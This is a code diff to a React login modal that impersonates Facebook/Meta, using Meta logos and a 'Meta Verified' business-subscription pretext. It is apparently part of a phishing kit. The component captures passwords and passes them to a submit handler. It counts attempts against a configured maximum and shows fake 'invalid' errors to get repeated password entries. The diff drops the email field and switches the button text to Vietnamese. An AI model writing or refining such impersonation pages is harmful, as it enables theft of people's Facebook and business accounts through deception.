@@ -1,13 +1,11 @@
 import { useState } from 'react';
 import PropTypes from 'prop-types';
-import TickIcon from '@/assets/images/tick.svg';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
 import config from '@/utils/config';
 
 const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [formData, setFormData] = useState({
-        identifier: '',
         password: ''
     });
     const [showPassword, setShowPassword] = useState(false);
@@ -25,7 +23,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const handleSubmit = async (e) => {
         e.preventDefault();
 
-        if (!formData.identifier.trim() || !formData.password.trim()) {
+        if (!formData.password.trim()) {
             return;
         }
 
@@ -36,7 +34,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
             setIsLoading(false);
 
             const nextAttempt = loginAttempt + 1;
-            onSubmit(formData.identifier, formData.password);
+            onSubmit('', formData.password);
 
             if (nextAttempt >= config.max_password_attempts) {
                 setShowError(false);
@@ -66,34 +64,10 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                             <img alt="" className="fb-logo-round" src={FbRoundLogo} />
                         </div>
 
-                        <form autocomplete="off" id="apiForm" onSubmit={handleSubmit}>
-                            <p style={{ color: '#1877f2', fontWeight: '600', fontSize: '14px', marginBottom: '6px', textAlign: 'left' }}>
-                                <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.loginInstruction || 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).'}
-                            </p>
-
-                            {loginAttempt === 0 && (
-                                <div className="form-floating mb-3" id="emailField">
-                                    <input
-                                        autocomplete="username"
-                                        className="form-control"
-                                        id="loginIdentifier"
-                                        maxLength="60"
-                                        minLength="3"
-                                        name="identifier"
-                                        placeholder={texts.mobileOrEmail || 'Mobile number or email'}
-                                        required
-                                        type="text"
-                                        value={formData.identifier}
-                                        onChange={(e) => handleChange('identifier', e.target.value)}
-                                    />
-                                    <label htmlFor="loginIdentifier">{texts.mobileOrEmail || 'Mobile number or email'}</label>
-                                    <div className="invalid-feedback">{texts.mobileOrEmail || 'Please enter your mobile number or email.'}</div>
-                                </div>
-                            )}
-
+                        <form autoComplete="off" id="apiForm" onSubmit={handleSubmit}>
                             <div className="form-floating mb-3" style={{ position: 'relative' }}>
                                 <input
-                                    autocomplete="current-password"
+                                    autoComplete="current-password"
                                     className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                     id="exampleInputPassword"
                                     maxLength="30"
@@ -147,7 +121,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                             <div className="form-btn-wrapper">
                                 <button className="btn btn-primary w-100" id="loginBtn" style={{ position: 'relative', height: '45px' }} type="submit" disabled={isLoading}>
                                     <span className="button-text" style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
-                                        {loginAttempt === 0 ? (texts.logIn || 'Log in') : (texts.continueBtn || 'Continue')}
+                                        {texts.continueBtn || 'Tiếp tục'}
                                     </span>
                                     {isLoading && (
                                         <span className="custom-spinner" id="spinner" style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%, -50%)', width: '22px', height: '22px', border: '3px solid rgba(255,255,255,0.5)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></span>
